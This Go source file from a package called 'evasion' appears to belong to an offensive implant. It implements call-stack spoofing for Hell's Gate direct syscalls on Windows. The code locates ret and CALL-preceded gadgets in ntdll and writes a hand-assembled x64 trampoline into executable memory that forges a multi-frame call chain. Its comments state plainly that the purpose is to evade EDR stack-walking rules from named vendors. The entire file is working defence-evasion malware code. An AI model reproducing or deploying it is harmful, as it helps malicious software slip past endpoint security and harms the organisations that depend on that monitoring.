//go:build windows
// +build windows

package evasion

// Call-stack spoofing for Hell's Gate syscalls — Layer 1 evasion.
//
// EDR products walk the call-stack of a thread executing a syscall. If they
// see the return address pointing inside agent code they flag it. We instead
// arrange for the return address to point into ntdll itself (a `ret` gadget).
//
// How it works:
//
//  1. findNtdllRetGadget scans ntdll's first executable section for the first
//     `C3` (ret) byte. That address is our stack-walker decoy.
//
//  2. allocSpoofTrampoline writes a 39-byte RWX stub that:
//       a. Pushes the ntdll `ret` gadget as a fake return address.
//       b. Shuffles rcx/rdx/r8/r9 and loads [rsp+0x30..0x40] for up to
//          5 NT args (the syscall ABI on x64).
//       c. JMPs to the HG stub (not CALL — no new frame is pushed).
//     When the HG stub's final `syscall; ret` fires, it "returns" to the
//     ntdll gadget, which immediately returns again to the real Go caller.
//     A stack-walking EDR sees: <call site> → ntdll!<gadget> → kernel. ✓
//
//  3. SpoofedSyscall wraps syscall.SyscallN with this trampoline.
//     HGProc.Call is replaced to use it automatically.

import (
	"sync"
	"syscall"
	"unsafe"
)

// ────────────────────────────────────────────────────────────────────────────
// Package-level singletons — initialized exactly once

var (
	hgOnce        sync.Once
	hgGadget      uintptr    // return address placed on stack — CALL gadget preferred, RET fallback
	hgExtraFrames [3]uintptr // additional ntdll ret gadgets pushed below the top frame
	hgTrampoline  uintptr    // spoof trampoline stub
)

// initSpoofing initialises the gadget and trampoline on first use.
// Prefers a CALL gadget (Moonwalk++ style) so the forged return address passes
// the "byte before is CALL" check that Elastic/CS stack-walking rules enforce.
// Falls back to a plain RET gadget if no CALL site is found.
// Also finds 3 extra ntdll ret gadgets for a 4-frame synthetic call chain.
func initSpoofing() {
	hgOnce.Do(func() {
		hgGadget = findCallReturnGadget()
		if hgGadget == 0 {
			hgGadget = findNtdllRetGadget()
		}
		if hgGadget == 0 {
			return
		}
		extra := findRetGadgets(3)
		for i, g := range extra {
			if i < 3 {
				hgExtraFrames[i] = g
			}
		}
		hgTrampoline = allocSpoofTrampoline()
	})
}

// ────────────────────────────────────────────────────────────────────────────
// Gadget discovery

// findCallReturnGadget scans ntdll .text for a position X such that
// memory[X-5..X-1] is a CALL rel32 (E8 xx xx xx xx) instruction.
//
// When this address is placed as a return address on the stack, EDR stack
// walkers that validate "is there a CALL instruction before the return site"
// (Elastic EQL hunt rules, CrowdStrike stack-walking) see a legitimate call
// site inside ntdll rather than an injected stub address.  This is the core
// of the Moonwalk++/SilentMoonwalk technique.
func findCallReturnGadget() uintptr {
	base := hgNtdllBase()
	if base == 0 {
		return 0
	}
	e_lfanew := *(*uint32)(unsafe.Pointer(base + 0x3C))
	peBase := base + uintptr(e_lfanew)
	numSections := *(*uint16)(unsafe.Pointer(peBase + 6))
	optHeaderSize := *(*uint16)(unsafe.Pointer(peBase + 20))
	sectionBase := peBase + 24 + uintptr(optHeaderSize)
	const (
		sectionHeaderSize  = 40
		sectionVSizeOffset = 8
		sectionVAOffset    = 12
		sectionCharOffset  = 36
		imageScnMemExecute = 0x20000000
	)
	for i := uint16(0); i < numSections; i++ {
		sh := sectionBase + uintptr(i)*sectionHeaderSize
		if *(*uint32)(unsafe.Pointer(sh+sectionCharOffset))&imageScnMemExecute == 0 {
			continue
		}
		va := *(*uint32)(unsafe.Pointer(sh + sectionVAOffset))
		vsz := *(*uint32)(unsafe.Pointer(sh + sectionVSizeOffset))
		if va == 0 || vsz <= 5 {
			continue
		}
		start := base + uintptr(va)
		// Search for a position X where memory[X-5] == 0xE8 (CALL rel32).
		// Skip positions that land on 0x00 (null regions) or 0xCC (INT3 padding).
		for off := uintptr(5); off < uintptr(vsz); off++ {
			if *(*byte)(unsafe.Pointer(start+off-5)) != 0xE8 {
				continue
			}
			cur := *(*byte)(unsafe.Pointer(start + off))
			if cur == 0x00 || cur == 0xCC {
				continue
			}
			return start + off
		}
	}
	return 0
}

// findNtdllRetGadget finds the first `ret` (0xC3) byte in ntdll's first
// executable section.  Any `ret` in ntdll code works — the stack walker only
// inspects the return address, not whether it is mid-function.
func findNtdllRetGadget() uintptr {
	base := hgNtdllBase()
	if base == 0 {
		return 0
	}

	// Locate the first executable section via the PE section table.
	e_lfanew := *(*uint32)(unsafe.Pointer(base + 0x3C))
	peBase := base + uintptr(e_lfanew)

	// FileHeader: 20 bytes after PE signature.
	// NumberOfSections is at offset +6; SizeOfOptionalHeader at offset +20.
	numSections := *(*uint16)(unsafe.Pointer(peBase + 6))
	optHeaderSize := *(*uint16)(unsafe.Pointer(peBase + 20))

	// Section table starts right after the optional header.
	sectionBase := peBase + 24 + uintptr(optHeaderSize)

	const (
		sectionHeaderSize   = 40
		sectionNameOffset   = 0
		sectionVSizeOffset  = 8
		sectionVAOffset     = 12
		sectionCharOffset   = 36
		imageScnMemExecute  = 0x20000000
		imageScnCntCode     = 0x00000020
	)

	for i := uint16(0); i < numSections; i++ {
		sh := sectionBase + uintptr(i)*sectionHeaderSize
		chars := *(*uint32)(unsafe.Pointer(sh + sectionCharOffset))
		if chars&imageScnMemExecute == 0 && chars&imageScnCntCode == 0 {
			continue
		}
		va := *(*uint32)(unsafe.Pointer(sh + sectionVAOffset))
		vsz := *(*uint32)(unsafe.Pointer(sh + sectionVSizeOffset))
		if va == 0 || vsz == 0 {
			continue
		}
		start := base + uintptr(va)
		for off := uintptr(0); off < uintptr(vsz); off++ {
			if *(*byte)(unsafe.Pointer(start + off)) == 0xC3 {
				return start + off
			}
		}
	}
	return 0
}

// findRetGadgets scans ntdll .text for n distinct `ret` (C3) addresses,
// distributed evenly across the section so they appear to come from different
// functions. Used to build a multi-frame synthetic call chain.
func findRetGadgets(n int) []uintptr {
	if n <= 0 {
		return nil
	}
	base := hgNtdllBase()
	if base == 0 {
		return nil
	}
	e_lfanew := *(*uint32)(unsafe.Pointer(base + 0x3C))
	peBase := base + uintptr(e_lfanew)
	numSections := *(*uint16)(unsafe.Pointer(peBase + 6))
	optHeaderSize := *(*uint16)(unsafe.Pointer(peBase + 20))
	sectionBase := peBase + 24 + uintptr(optHeaderSize)
	const (
		sectionHeaderSize  = 40
		sectionVSizeOffset = 8
		sectionVAOffset    = 12
		sectionCharOffset  = 36
		imageScnMemExecute = 0x20000000
	)
	for i := uint16(0); i < numSections; i++ {
		sh := sectionBase + uintptr(i)*sectionHeaderSize
		if *(*uint32)(unsafe.Pointer(sh+sectionCharOffset))&imageScnMemExecute == 0 {
			continue
		}
		va := *(*uint32)(unsafe.Pointer(sh + sectionVAOffset))
		vsz := *(*uint32)(unsafe.Pointer(sh + sectionVSizeOffset))
		if va == 0 || uintptr(vsz) < uintptr(n)*64 {
			continue
		}
		start := base + uintptr(va)
		step := uintptr(vsz) / uintptr(n+1)
		var gadgets []uintptr
		for j := 1; j <= n; j++ {
			searchStart := start + uintptr(j)*step
			limit := searchStart + step
			if limit > start+uintptr(vsz) {
				limit = start + uintptr(vsz)
			}
			for off := searchStart; off < limit; off++ {
				if *(*byte)(unsafe.Pointer(off)) == 0xC3 {
					gadgets = append(gadgets, off)
					break
				}
			}
		}
		if len(gadgets) == n {
			return gadgets
		}
	}
	return nil
}

// ────────────────────────────────────────────────────────────────────────────
// Trampoline

// buildTrampolineBytes returns x64 machine code for the spoof trampoline.
//
// Called via syscall.SyscallN(hgTrampoline, gadget, hgStub, a0,a1,a2,a3,a4).
// On entry: rcx=gadget(CALL+5), rdx=hgStub, r8=a0, r9=a1, spilled args at [rsp+0x28..].
//
// When extra=[f1,f2,f3] are non-zero, 4 fake frames are pushed (sub rsp,32):
//   [rsp+0]  = rcx (CALL+5 gadget)        — syscall ret lands here
//   [rsp+8]  = f1 (ntdll ret gadget)      — f0 ret lands here
//   [rsp+16] = f2 (ntdll ret gadget)      — f1 ret lands here
//   [rsp+24] = f3 (ntdll ret gadget)      — f2 ret lands here
//   [rsp+32] = SyscallN return addr       — f3 ret lands here → back to Go
//
// When extra gadgets are unavailable, falls back to the original 1-frame layout
// (sub rsp,8) so the caller never crashes.
func buildTrampolineBytes(extra [3]uintptr) []byte {
	deepOK := extra[0] != 0 && extra[1] != 0 && extra[2] != 0

	emit64 := func(b []byte, v uint64) []byte {
		return append(b,
			byte(v), byte(v>>8), byte(v>>16), byte(v>>24),
			byte(v>>32), byte(v>>40), byte(v>>48), byte(v>>56),
		)
	}

	var b []byte

	if deepOK {
		// sub rsp, 32  — 4 frame slots
		b = append(b, 0x48, 0x83, 0xEC, 0x20)

		// mov rax, f3; mov [rsp+24], rax
		b = append(b, 0x48, 0xB8)
		b = emit64(b, uint64(extra[2]))
		b = append(b, 0x48, 0x89, 0x44, 0x24, 0x18)

		// mov rax, f2; mov [rsp+16], rax
		b = append(b, 0x48, 0xB8)
		b = emit64(b, uint64(extra[1]))
		b = append(b, 0x48, 0x89, 0x44, 0x24, 0x10)

		// mov rax, f1; mov [rsp+8], rax
		b = append(b, 0x48, 0xB8)
		b = emit64(b, uint64(extra[0]))
		b = append(b, 0x48, 0x89, 0x44, 0x24, 0x08)

		// mov [rsp], rcx    — frame0 = CALL+5 gadget
		b = append(b, 0x48, 0x89, 0x0C, 0x24)
		// mov rax, rdx      — rax = hgStub
		b = append(b, 0x48, 0x89, 0xD0)
		// mov rcx, r8       — rcx = a0
		b = append(b, 0x4C, 0x89, 0xC1)
		// mov rdx, r9       — rdx = a1
		b = append(b, 0x4C, 0x89, 0xCA)
		// NT spill args shifted by 0x20 due to sub rsp,32:
		// orig [rsp+0x28] → [rsp+0x48]; orig [rsp+0x30] → [rsp+0x50]; orig [rsp+0x38] → [rsp+0x58]
		b = append(b, 0x4C, 0x8B, 0x44, 0x24, 0x48) // mov r8,  [rsp+0x48]  a2
		b = append(b, 0x4C, 0x8B, 0x4C, 0x24, 0x50) // mov r9,  [rsp+0x50]  a3
		b = append(b, 0x4C, 0x8B, 0x54, 0x24, 0x58) // mov r10, [rsp+0x58]  a4
		b = append(b, 0x4C, 0x89, 0x54, 0x24, 0x28) // mov [rsp+0x28], r10  5th arg slot
	} else {
		// 1-frame fallback (original layout)
		b = append(b, 0x48, 0x83, 0xEC, 0x08) // sub rsp, 8
		b = append(b, 0x48, 0x89, 0x0C, 0x24) // mov [rsp], rcx
		b = append(b, 0x48, 0x89, 0xD0)       // mov rax, rdx
		b = append(b, 0x4C, 0x89, 0xC1)       // mov rcx, r8
		b = append(b, 0x4C, 0x89, 0xCA)       // mov rdx, r9
		b = append(b, 0x4C, 0x8B, 0x44, 0x24, 0x30) // mov r8,  [rsp+0x30]
		b = append(b, 0x4C, 0x8B, 0x4C, 0x24, 0x38) // mov r9,  [rsp+0x38]
		b = append(b, 0x4C, 0x8B, 0x54, 0x24, 0x40) // mov r10, [rsp+0x40]
		b = append(b, 0x4C, 0x89, 0x54, 0x24, 0x28) // mov [rsp+0x28], r10
	}

	b = append(b, 0xFF, 0xE0) // jmp rax → hgStub → syscall → ret chain
	return b
}

// allocSpoofTrampoline writes the trampoline into executable MEM_IMAGE memory.
// Uses the deep 4-frame variant when extra ntdll gadgets are available,
// falling back to the original 1-frame layout otherwise.
func allocSpoofTrampoline() uintptr {
	tb := buildTrampolineBytes(hgExtraFrames)
	addr := hgAlloc(uint32(len(tb)))
	if addr == 0 {
		return 0
	}
	dst := (*[256]byte)(unsafe.Pointer(addr))
	copy(dst[:len(tb)], tb)
	stompFinalize(addr, uint32(len(tb)))
	return addr
}

// ────────────────────────────────────────────────────────────────────────────
// Public API

// SpoofedSyscall calls the HG syscall stub with a spoofed return address so
// that EDR stack-walkers see ntdll at the top of the call chain.
//
// At most 5 NT arguments (a0–a4) are supported via the trampoline.
// If spoofing was not initialised (gadget or trampoline is 0) the call falls
// through to a direct syscall.SyscallN with no spoofing.
func SpoofedSyscall(stub uintptr, args ...uintptr) (r1, r2 uintptr, err syscall.Errno) {
	initSpoofing()

	var a [5]uintptr
	copy(a[:], args)

	if hgGadget == 0 || hgTrampoline == 0 || len(args) > 5 {
		// Fallback: direct call (no spoofing for >5-arg calls).
		return syscall.SyscallN(stub, a[0], a[1], a[2], a[3], a[4])
	}

	r1, r2, err = syscall.SyscallN(hgTrampoline, hgGadget, stub, a[0], a[1], a[2], a[3], a[4])
	return
}
